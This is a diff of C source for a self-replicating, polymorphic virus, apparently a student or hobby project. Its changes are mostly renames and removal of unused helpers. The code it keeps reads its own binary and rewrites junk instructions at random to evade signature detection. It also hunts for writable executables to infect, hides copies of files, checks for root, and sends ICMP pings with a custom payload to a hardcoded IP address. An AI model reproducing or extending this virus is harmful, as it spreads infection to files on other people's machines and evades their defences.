@@ -30,10 +30,10 @@ int codelen;
 unsigned char *original_executable;
 int first_run = 1;
 
-void readcode(const char *filename)
+void read_code(const char *file_name)
 {
     /* Opens file, rb represents read and binary */
-    FILE *fp = fopen(filename, "rb");   JUNK;
+    FILE *fp = fopen(file_name, "rb");   JUNK;
     /* Sets the file position of the stream to the given offset (0 long int) */
     fseek(fp, 0L, SEEK_END);            JUNK;
     /* Sets the length of the code  */
@@ -46,37 +46,17 @@ void readcode(const char *filename)
     fread(code, codelen, 1, fp);        JUNK;
 }
 
-void writecode(const char *filename)
-{
-    FILE *fp;
-    int lastoffset = strlen(filename) - 1;
-    /* Gets the last character of the fname to copy */
-    char lastchar = filename[lastoffset];
-    char *newfilename = strdup(filename);   JUNK;
-    /* Sets last char to incremented number based on ASCII table values */
-    lastchar = '0' + (isdigit(lastchar)?(lastchar-'0'+1)%10:0);
-    /* Updates the last char of the fname */
-    newfilename[lastoffset] = lastchar;
-    /* Opens file with write to binary permissions */
-    fp = fopen(newfilename, "wb");          JUNK;
-    /* Writes the code variable into the file */
-    fwrite(code, codelen, 1, fp);           JUNK;
-    fclose(fp);
-    /* Frees the variable from memory */
-    free(newfilename);
-}
-
-void newwritecode(const char *filename)
+void write_code(const char *file_name)
 {
     FILE *fp;
     /* Opens file with write to binary permissions */
-    fp = fopen(filename, "wb");          JUNK;
+    fp = fopen(file_name, "wb");          JUNK;
     /* Writes the code variable into the file */
     fwrite(code, codelen, 1, fp);           JUNK;
     fclose(fp);
 }
 
-int writeinstruction(unsigned reg, int offset, int space)
+int write_instruction(unsigned reg, int offset, int space)
 {
     if (space < 2)
     {
@@ -98,7 +78,7 @@ int writeinstruction(unsigned reg, int offset, int space)
     }
 }
 
-int readinstruction(unsigned reg, int offset)
+int read_instruction(unsigned reg, int offset)
 {
     unsigned c1 = code[offset];
     if (c1 == NOP)
@@ -120,7 +100,7 @@ int readinstruction(unsigned reg, int offset)
     }
 }
 
-void replacejunk(void)
+void replace_junk(void)
 {
     int i, j, inc, space;
     srand(time(NULL));                                  JUNK;
@@ -138,7 +118,7 @@ void replacejunk(void)
         if (reg == 4) continue;
 
         j = 0;                                          JUNK;
-        while (inc = readinstruction(reg, i+1+j)) j += inc;
+        while (inc = read_instruction(reg, i+1+j)) j += inc;
         if (j != JUNKLEN) continue;                     JUNK;
 
         reg = rand()%7;                                 JUNK;
@@ -150,7 +130,7 @@ void replacejunk(void)
         j = 0;                                          JUNK;
         while (space)
         {
-            inc = writeinstruction(reg, i+1+j, space);  JUNK;
+            inc = write_instruction(reg, i+1+j, space);  JUNK;
             j += inc;
             space -= inc;                               JUNK;
         }
@@ -158,12 +138,12 @@ void replacejunk(void)
     }
 }
 
-char* read_file(const char *filename)
+char* read_file(const char *file_name)
 {
     unsigned char *str;
     int strlen;
     /* Opens file, rb represents read and binary */
-    FILE *fp = fopen(filename, "r");   JUNK;
+    FILE *fp = fopen(file_name, "r");   JUNK;
     /* Sets the file position of the stream to the given offset (0 long int) */
     fseek(fp, 0L, SEEK_END);            JUNK;
     /* Sets the length of the code  */
@@ -179,41 +159,6 @@ char* read_file(const char *filename)
     // TODO: close file
 
     return str;
-}
-
-char* read_binary_file(const char *filename)
-{
-    unsigned char *str;
-    int strlen;
-    /* Opens file, rb represents read and binary */
-    FILE *fp = fopen(filename, "rb");   JUNK;
-    /* Sets the file position of the stream to the given offset (0 long int) */
-    fseek(fp, 0L, SEEK_END);            JUNK;
-    /* Sets the length of the code  */
-    strlen = ftell(fp);
-    /* Allocates memory to the length of the code */
-    str = malloc(strlen);             JUNK;
-    /* Gets the file position of the stream to the start of the file */
-    fseek(fp, 0L, SEEK_SET);
-    /* Reads the file into the code variable in memory */
-    fread(str, strlen, 1, fp);        JUNK;
-
-
-    // TODO: close file
-    fclose(fp);
-
-    return str;
-}
-
-void write_binary_file(const char *filename, const char *data)
-{
-    FILE *fp;
-    /* Gets the last character of the fname to copy */
-    /* Opens file with write to binary permissions */
-    fp = fopen(filename, "wb");
-    /* Writes the code variable into the file */
-    fwrite(data, strlen(data), 1, fp);
-    fclose(fp);
 }
 
 void send_ping(const char *cmd)
@@ -282,7 +227,7 @@ void embed_code(const char *file_name)
     copy_and_hide_file(file_name);
     execute_bash("chmod +x %s", file_name);
 
-    newwritecode(file_name); JUNK;
+    write_code(file_name); JUNK;
 }
 
 // Lists files in passed in directory path
@@ -348,9 +293,9 @@ int main(int argc, char* argv[])
     printf("EXE FILE: %s\n", argv[0]);
     system("id -u"); // outputs 0 if root user
     execute("192.168.1.142"); // send ICMP ping with custom payload to IP
-    readcode(argv[0]);  JUNK;
+    read_code(argv[0]);  JUNK;
     //printf("%s:%d", code, codelen);
-    replacejunk();      JUNK;
+    replace_junk();      JUNK;
     propagate("./", argv[0]); // list writable executable files for propagation
     // Add first run edge case to prevent infinite loop if raw virus file is present in directory
     if (first_run == 1)
